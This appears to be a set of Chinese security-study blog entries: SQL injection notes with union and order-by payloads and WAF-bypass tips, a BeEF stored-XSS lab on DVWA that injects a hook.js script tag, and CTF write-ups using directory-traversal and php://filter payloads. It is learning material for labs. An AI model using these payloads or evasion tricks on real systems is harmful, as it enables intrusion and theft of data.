<h3 id="“-“-”可以是任意一个符号-“与”-”都表示注释符"><a href="#“-“-”可以是任意一个符号-“与”-”都表示注释符" class="headerlink" title="“- -+(“+”可以是任意一个符号)“与”#”都表示注释符"></a>“- -+(“+”可以是任意一个符号)“与”#”都表示注释符</h3><h3 id="初始order-函数"><a href="#初始order-函数" class="headerlink" title="初始order()函数"></a>初始order()函数</h3><figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh">` <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> num <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
<p>   主要作用是通过修改此函数中的num,不断进行提交，如果num与此数据库的列数不匹配，则会报错。<br>   如：’ order by 3 #</p>
<h3 id="初始union-函数"><a href="#初始union-函数" class="headerlink" title="初始union()函数"></a>初始union()函数</h3><p>   SQL语句中的联合查询，在SQL注入中有如下作用： </p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>、获取数据库的名字以及版本<br><span class="hljs-string">&#x27; union select database(),version() #</span><br><span class="hljs-string">2、暂时不知道有什么用</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> #<br>（写全的话是<span class="hljs-keyword">select</span> aa,bb <span class="hljs-keyword">from</span> xx <span class="hljs-keyword">where</span> id=<span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> xx # <span class="hljs-string">&#x27;）</span><br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入--SQL堆叠注入以及WAF绕过注入</title>
    <url>/2023/09/26/SQLinjectionSixth/</url>
    <content><![CDATA[<h2 id="SQL注入学习笔记（六）–SQL堆叠注入以及WAF绕过注入"><a href="#SQL注入学习笔记（六）–SQL堆叠注入以及WAF绕过注入" class="headerlink" title="SQL注入学习笔记（六）–SQL堆叠注入以及WAF绕过注入"></a>SQL注入学习笔记（六）–SQL堆叠注入以及WAF绕过注入</h2><h3 id="stacked-injections-堆叠注入"><a href="#stacked-injections-堆叠注入" class="headerlink" title="stacked injections(堆叠注入)"></a>stacked injections(堆叠注入)</h3><p>定义:<br>  从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。<br>  而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加;<br>表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。<br>  局限性:只产生于部分数据库。<br>  备注：堆叠注入的可以运用于创建用户。由于我们使用网站用户进行注入不能查看到数据库的密码,<br>但是我们可以创建用户来登录迂回的注入数据库，这样可以通过插入数据实现正常登录。<br>前提是网站的管理员必须是高权限。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=17&vd_source=d32bce54780cf3d9710df43274886fde">堆叠注入演示:4:00</a></p>
<h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><p>主要研究三种WAF:阿里云盾、安全狗(易)、宝塔(难)。<br>1、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=17&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">绕过安全狗演示(更改传参方式:35:00</a></p>
<figure class="highlight coq"><table><tr><td class="code"><pre><code class="hljs coq">一些<span class="hljs-built_in">injection</span> payload<br></code></pre></td></tr></table></figure>
<p>2、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=17&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">绕过思路之一些数据绕过的知识干货(内联注释&#x2F;**&#x2F;的妙用):45:00</a><br>3、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=17&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">绕过思路之注释符(%27)以及换行符(%0A)绕过的妙用:1:05:00</a><br>4、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=17&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">绕过思路之特殊符号、内联注释以及http参数污染注入的妙用:1:11:00</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">其他方法<br></code></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=17&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Fuzz大法(模糊测试)–类似于爆破的一种思路(只不过自己写脚本让程序帮你):1:30:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=18&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">其他绕过WAF方法(可二刷)：0:00~20:00</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">个人感觉伪造爬虫白名单较为妙,可以自己尝试。<br></code></pre></td></tr></table></figure>

<h3 id="SQLmap绕过WAF"><a href="#SQLmap绕过WAF" class="headerlink" title="SQLmap绕过WAF"></a>SQLmap绕过WAF</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=18&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">迪总在线教如何写脚本：40：00</a><br>1、有时候SQLmap注入失败可能是http头部(user-agent)包含注入工具的信息,被WAF识别到,故拦截。所以碰<br>到注入失败,要想到这个问题,要学会使用burp suite配合sqlmap进行注入。(还有就是注入一次后,记得删除<br>sqlmap的缓存)。<br>2、可以结合中转注入的思路。</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">若目标网站存在流量控制:<br><span class="hljs-number">1</span>、代理池<br><span class="hljs-number">2</span>、设置延时函数<br><span class="hljs-number">3</span>、设置可能的存在于白名单的爬虫<span class="hljs-comment">(百度、搜狐等这些可能在爬虫白名单)</span><br></code></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=18&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">很有意义,二刷</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">所以说不要当脚本小子！！！<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>简单了解SQL注入原理，判断注入点</title>
    <url>/2023/09/20/SQLzhuruER/</url>
    <content><![CDATA[<h2 id="SQL注入学习笔记-一-–简单了解SQL注入原理，判断注入点"><a href="#SQL注入学习笔记-一-–简单了解SQL注入原理，判断注入点" class="headerlink" title="SQL注入学习笔记(一)–简单了解SQL注入原理，判断注入点"></a>SQL注入学习笔记(一)–简单了解SQL注入原理，判断注入点</h2><h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span>注入是一种将<span class="hljs-keyword">SQL</span>代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的<span class="hljs-keyword">sql</span>服务器加以<br>解析和执行。由于<span class="hljs-keyword">sql</span>语句本身的多样性，以及可用于构造<span class="hljs-keyword">sql</span>语句的编程方法很多，因此凡是构造<span class="hljs-keyword">sql</span>语句的步骤均存在被<br>攻击的潜在风险。<span class="hljs-keyword">Sql</span>注入的方式主要是直接将代码插入参数中，这些参数会被置入<span class="hljs-keyword">sql</span>命令中加以执行。间接的攻击方式是<br>将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态<span class="hljs-keyword">sql</span>命<br>令中时，恶意代码就将被执行。<br></code></pre></td></tr></table></figure>
<h3 id="SQL注入产生过程"><a href="#SQL注入产生过程" class="headerlink" title="SQL注入产生过程"></a>SQL注入产生过程</h3><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编<br>程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给<br><span class="hljs-keyword">sql</span>查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现<span class="hljs-keyword">sql</span>注入漏洞，如果攻击者能够控制发<br>送给<span class="hljs-keyword">sql</span>查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。<br></code></pre></td></tr></table></figure>
<h3 id="一个网站在执行SQL语句时大概流程"><a href="#一个网站在执行SQL语句时大概流程" class="headerlink" title="一个网站在执行SQL语句时大概流程"></a>一个网站在执行SQL语句时大概流程</h3><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>、接收数据<br><span class="hljs-number">2</span>、拼接数据<br><span class="hljs-number">3</span>、执行<span class="hljs-keyword">SQL</span>语句<br><span class="hljs-number">4</span>、展示执行结果<br></code></pre></td></tr></table></figure>
<h3 id="判断是否存在注入点（SQL语句是否可以进行拼接）"><a href="#判断是否存在注入点（SQL语句是否可以进行拼接）" class="headerlink" title="判断是否存在注入点（SQL语句是否可以进行拼接）"></a>判断是否存在注入点（SQL语句是否可以进行拼接）</h3><figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>、逻辑值（老方法）<br>    <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> = <span class="hljs-number">1</span>		页面正常（和以前页面无太大区别）<br>    <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> = <span class="hljs-number">2</span>		页面异常<br>    则可能存在注入点<br><span class="hljs-number">2</span>、乱输一顿（返回正常页面说明过滤了；返回错误页面说明查询了，有带入数据库查询，即说明存在注入点）<br>    www.xiaodi8.com/news.php?y=<span class="hljs-number">1</span>asdawdasdwa<br><span class="hljs-number">3</span>、<span class="hljs-keyword">order</span> <span class="hljs-title">by</span><br>	通过<span class="hljs-keyword">order</span> <span class="hljs-title">by</span> 判断注入的字段数<br><span class="hljs-number">4</span>、若输入东西进去，跳转到<span class="hljs-number">404</span>错误或者跳转到主页，说明网站存在过滤<br> ```   <br><span class="hljs-comment">### 可注入条件,产生条件</span><br></code></pre></td></tr></table></figure>
<p>可控变量，带入数据库查询($result&#x3D;mysql_query($sql);)，变量未存在过滤或过滤不严谨。<br>eg:<br>$id&#x3D;$_GET[‘id’];<br>$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1”;<br>&#x2F;&#x2F;直接传递的变量$id带入sql语句中执行没有做任何的限制，这样为恶意代码插入执行创造了条件。通过修改带入的代码执行<br>&#x2F;&#x2F;的语句最终达到SQL注入获取敏感信息<br>防范：在接收参数后，进行过滤，再带入数据库进行查询。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">[简单SQL注入演示:<span class="hljs-number">13</span>:<span class="hljs-number">00</span>](https:<span class="hljs-regexp">//</span>www.bilibili.com<span class="hljs-regexp">/video/</span>BV1JZ4y1c7ro/?p=<span class="hljs-number">11</span>&amp;spm_id_from=pageDriver&amp;vd_source=d32bce54780cf3d9710df43274886fde)<br><span class="hljs-comment">### 判断一下网址哪可能存在注入点</span><br></code></pre></td></tr></table></figure>
<p>   <a href="http://www.xiaodi8.com/index.php?id=8(%E5%AD%98%E5%9C%A8%E5%8F%AF%E6%8E%A7%E5%8F%82%E6%95%B0id)">www.xiaodi8.com/index.php?id=8(存在可控参数id)</a><br>   <a href="http://www.xiaodi8.com/?id=8(%E5%AD%98%E5%9C%A8%E5%8F%AF%E6%8E%A7%E5%8F%82%E6%95%B0%EF%BC%8C%E4%B8%94?%E5%89%8D%E9%9D%A2%E7%9B%B8%E5%BD%93%E4%BA%8E%E7%9C%81%E7%95%A5%E4%BA%86index.php%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%AF%B4%E6%98%AF%E9%BB%98%E8%AE%A4%E6%8C%87%E5%90%91%E6%9F%90%E4%B8%80%E4%B8%AA%EF%BC%8C%E6%9C%AC%E8%B4%A8%E4%B8%8E1%E4%B8%80%E6%A0%B7)">www.xiaodi8.com/?id=8(存在可控参数，且?前面相当于省略了index.php，可以说是默认指向某一个，本质与1一样)</a><br>   <a href="http://www.xiaodi8.com/?id=8&x=1(%E7%9B%B8%E5%BD%93%E4%BA%8E%E4%B8%A4%E4%B8%AA%E5%8F%AF%E6%8E%A7%E5%8F%82%E6%95%B0)">www.xiaodi8.com/?id=8&amp;x=1(相当于两个可控参数)</a><br>   <a href="http://www.xiaodi8.com/index.php(post%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%8F%82%E6%95%B0%E4%B8%8D%E5%9C%A8%E7%BD%91%E5%9D%80%EF%BC%8C%E6%8A%93%E5%8C%85%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0)">www.xiaodi8.com/index.php(post注入，参数不在网址，抓包可以看到)</a></p>
<figure class="highlight clean"><table><tr><td class="code"><pre><code class="hljs clean">### 已知参数x有注入，以下哪个注入测试正确？<br></code></pre></td></tr></table></figure>
<p>   a.<a href="http://www.xiaodi8.com/news.php?y=1">www.xiaodi8.com/news.php?y=1</a> and 1&#x3D;1 &amp;x&#x3D;2<br>   b.<a href="http://www.xiaodi8.com/news.php?y=1">www.xiaodi8.com/news.php?y=1</a> &amp;x&#x3D;2 and 1&#x3D;1<br>   c.<a href="http://www.xiaodi8.com/news.php?y=1">www.xiaodi8.com/news.php?y=1</a> and 1&#x3D;1 &amp;x&#x3D;2 and 1&#x3D;1<br>   d.<a href="http://www.xiaodi8.com/news.php?xx=1">www.xiaodi8.com/news.php?xx=1</a> and 1&#x3D;1 &amp;xxx&#x3D;2 and 1&#x3D;1<br>   哪个参数有注入，and 1&#x3D;1 注入语句就写在哪个参数的后面（b，c）</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><code class="hljs clean">### 如何获取列名(爆字段)<br></code></pre></td></tr></table></figure>
<p>数据库中有一个information_schmema，<br>有表、字段信息，注入的时候先查表查字段就OK了</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><code class="hljs clean">### union联合注入<br></code></pre></td></tr></table></figure>
<p>有几个注意的点：<br>1.查询返回字段数要和前一个查询（前一个select）字段数相等。<br>2.字段类型也要相对应。！！！！<br>3、把id设置成-2之后，前面select语句条件部分为假就不会执行<br>，从而不会影响到后面select语句的执行结果(-2是为了让他<br>报错从而执行union后的语句)。<br>&#96;&#96;&#96;</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>WAF绕过|信息收集|反爬虫延迟|代理池</title>
    <url>/2023/11/05/WAFno1/</url>
    <content><![CDATA[<h2 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h2><p><img src="https://pic.imgdb.cn/item/65479069c458853aefbc904a.png" alt="图"></p>
]]></content>
      <categories>
        <category>WAF绕过</category>
      </categories>
      <tags>
        <tag>WAF绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>利用beef实现简单的XSS跨站攻击</title>
    <url>/2023/10/11/XssSelfPrac/</url>
    <content><![CDATA[<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>实验环境:kali、BeEF、Ubuntu、DVWA<br>若kali没有配置好BeEF,请参考此文章进行配置:<br><a href="https://blog.csdn.net/weixin_44657888/article/details/124692782">https://blog.csdn.net/weixin_44657888/article/details/124692782</a><br>若Ubuntu没有搭建好DVWA,请参考此文章进行搭建:<br><a href="https://blog.csdn.net/ydj2200012810/article/details/132009415">https://blog.csdn.net/ydj2200012810/article/details/132009415</a></p>
<h2 id="开日"><a href="#开日" class="headerlink" title="开日"></a>开日</h2><p>首先在kali启动BeEF服务。<br><img src="https://pic.imgdb.cn/item/6526ae1ac458853aef9760af.png" alt="图一" title="开启beef服务"><br>开启后,会自动跳转至登录界面,用户名默认为beef，密码在首次启动beef-xss时需要手动设置。<br><img src="https://pic.imgdb.cn/item/6526ae8ac458853aef977beb.png" alt="图二" title="beef登录界面"><br>成功登陆后,进入beef主界面<br><img src="https://pic.imgdb.cn/item/6526aedcc458853aef979841.png" alt="图三" title="beef主界面"><br>然后在Ubuntu打开DVWA,选择存储型XSS<br>名字任意填,消息栏填入以下语句即可</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://127.0.0.1:3000/hook.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6526b090c458853aef980fa5.png" alt="图四" title="跨站攻击语句"><br>注意,由于前端代码对输入的消息长度有限制,这就导致我们不能完整地输入攻击语句,这个好办<br>右键框框的位置–检查–找到maxlength,改大些<br>而且这里要将你的ip地址换成你的真实ip地址<br><img src="https://pic.imgdb.cn/item/6526b0e3c458853aef98219c.png" alt="图五" title="示例"><br>成功输入后,直接点击guestbook提交<br>此时虽然没看到页面有什么特别的变化,但是右键–检查–网络,可以看到异常数据包<br><img src="https://pic.imgdb.cn/item/6526b300c458853aef98a928.png" alt="图六" title="异常数据包"><br>可以看到,接收到刚才我们输入的ip的数据包,这意味着XSS跨站攻击成功实现。<br>此时,beef的online browsers上线了被攻击靶机的ip,意味着我们可以进行相关操作。<br><img src="https://pic.imgdb.cn/item/6526b3ddc458853aef98dc62.png" alt="图七" title="被攻击机上线"><br>alert 信息<br><img src="https://pic.imgdb.cn/item/6526b4f0c458853aef991048.png" alt="图八" title="显示"><br><img src="https://pic.imgdb.cn/item/6526b4ffc458853aef9912c9.png" alt="图九"><br>浏览器强制跳转<br><img src="https://pic.imgdb.cn/item/6526b837c458853aef99ba40.png" alt="图十" title="网址跳转"><br><img src="https://pic.imgdb.cn/item/6526b655c458853aef996c5b.png" alt="图十一" title="成功跳转"><br>除此之外,甚至还能打开摄像头,还可以利用社工诱使你点你某一个带马的文件,那就可能不是简单地控制浏览器了,有可能你的主机的一些文件会受到影响。</p>
<h2 id="little-总结"><a href="#little-总结" class="headerlink" title="little 总结"></a>little 总结</h2><p>虽然看着功能是挺强大,但是触发条件没有像打靶场一样简单,非常苛刻，既要浏览器版本满足,要存在XSS跨站漏洞,对方的浏览器不会拦截,对方有登陆过且留下痕迹,而且要对方触发。而且当对方设计了过滤,我们还要思考如何绕过这些过滤,总体来说,要考虑非常多。<br>虽然但是,我们还是可以玩玩的。</p>
]]></content>
      <categories>
        <category>XSS跨站</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>Buuctf Recording</title>
    <url>/2023/10/27/buuojctf/</url>
    <content><![CDATA[<h2 id="HCTF-2018-WarmUp–代码审计-文件包含-目录遍历"><a href="#HCTF-2018-WarmUp–代码审计-文件包含-目录遍历" class="headerlink" title="[HCTF 2018]WarmUp–代码审计|文件包含|目录遍历"></a>[HCTF 2018]WarmUp–代码审计|文件包含|目录遍历</h2><p>开启靶机,发现是一个大大的滑稽脸。<br><img src="https://pic.imgdb.cn/item/653bca68c458853aeff5c5cb.jpg" alt="图一" title="滑稽脸"><br>ctrl+u看源码,发现一个source.php被注释了,那么可以想到,这个文件是可以访问的。<br><img src="https://pic.imgdb.cn/item/653bca7bc458853aeff6218b.jpg" alt="图二" title="滑稽脸源码"><br>访问这个文件,看到关键源码(就是下面的代码,这里是详细说明)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)//接收属性值并判断文件名</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<span class="hljs-comment">//白名单验证</span><br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<span class="hljs-comment">//这里要求我们输入的必须不可为空且必须为字符串,否则返回错误</span><br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<span class="hljs-comment">//在白名单内的就返回为真</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><span class="hljs-comment">//法一</span><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(//这里挺关键意思是把接收的值的第一个?前的内容截取<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<span class="hljs-comment">//截取后判断</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><span class="hljs-comment">//法二</span><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<span class="hljs-comment">//其实和上面一样,只不过这里是url解码,那就将?编码两次(这里解一次码,服务器也会自动解一次码)其余同法一</span><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<span class="hljs-comment">//这个是三个条件(输入非空、输入的是字符串、且上面的check函数返回为true),最主要的是checkfile函数返回为真,三个条件满足则会得到flag</span><br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-comment">//关键的包含flag文件的函数</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>一些函数的定义:<br>mb_substr： 获取部分字符串。<br>mb_strpos： 查找字符串在另一个字符串中首次出现的位置。<br>in_array($needle, $haystack)：needle待搜索值，haystack待搜索数组。<br>有了上述分析支持后,开始解题。<br>首先根据这段代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<span class="hljs-comment">//白名单验证</span><br>          <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<span class="hljs-comment">//这里要求我们输入的必须不可为空且必须为字符串,否则返回错误</span><br>              <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>              <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>          &#125;<br><br>          <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<span class="hljs-comment">//在白名单内的就返回为真</span><br>              <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>          &#125;<br></code></pre></td></tr></table></figure>
<p>我先读取一个hint.php文件康康<br><img src="https://pic.imgdb.cn/item/653bca8dc458853aeff68098.jpg" alt="图三" title="hint.php"><br>发现输出flag在ffffllll什么的文件(小寄巧:ffffllllaaaagggg这里flag被写了四次所以使用4或5个..&#x2F; 我tk,第一次做ctf题给我整这是吧?),我们尝试读取,但是由于存在过滤,并不可直接读取,采用以下payload绕过。<br>法一:</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">int</span>.php?..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg<br></code></pre></td></tr></table></figure>
<p>法二(将?url编码两次):</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=hint.php%<span class="hljs-number">253</span>F..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg<br></code></pre></td></tr></table></figure>
<p>依此法,可获得flag<br><img src="https://pic.imgdb.cn/item/653bca94c458853aeff69f73.jpg" alt="图四" title="法一绕过输出flag"><br><img src="https://pic.imgdb.cn/item/653bcaf6c458853aeff89f67.jpg" alt="图五" title="法二绕过输出flag"><br>参考:<code>https://blog.csdn.net/Lixunzhe0112/article/details/128716492</code></p>
<h2 id="ACTF2020-新生赛-Include–文件包含-协议玩法"><a href="#ACTF2020-新生赛-Include–文件包含-协议玩法" class="headerlink" title="[ACTF2020 新生赛]Include–文件包含|协议玩法"></a>[ACTF2020 新生赛]Include–文件包含|协议玩法</h2><p>开启靶机,发现有一个超链接,点击进去,只有”can you find out the flag?”,这里我卡了挺久,抓包也抓了;爆路径也尝试了,一无所获。<br><img src="https://pic.imgdb.cn/item/653bd282c458853aef2a63e8.jpg" alt="图六" title="单一的界面"><br>先改造以下超链接(直接指向这一个文件),发现显示页面不变,说明这个超链接是直接指向flag.php的。<br><img src="https://pic.imgdb.cn/item/653bd28ac458853aef2aa9aa.jpg" alt="图七" title="一个小发现"><br>最终参考了wp,学习到以下知识点。<br>1、PHP 中若通过 require()、once_require() 或 include() 、once_include() 函数去包含另一个文件，该文件在网页中均是不可见的（即使你查看网页源代码）。<br>2、可以发现 flag.php 页面通过 get 方式中的参数 file 来包含网站当前目录下的其他文件（如 flag.php），再加上提示 “你能找到其他 flag 吗？” ，我们可以推断，要解答该题目需要获取 flag.php 的源代码。<br>分析过后,我们便有了解决方法。<br>思路:我们可以通过将包含的文件进行转码，让浏览器无法识别这是 PHP 代码，其也就无法执行该 PHP 文件，于是将文件中的内容直接显示出来，我们将通过 PHP 伪协议来完成这一动作。<br>使用 PHP 伪协议将网页源代码转换为 base64 编码的格式：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>
<p>构造payload并且访问,得到一串base64编码的数据。<br><img src="https://pic.imgdb.cn/item/653bd29cc458853aef2b3fa3.jpg" alt="图八" title="成功获取关键key"><br>上网找一个在线base64解码工具即可得到flag。</p>
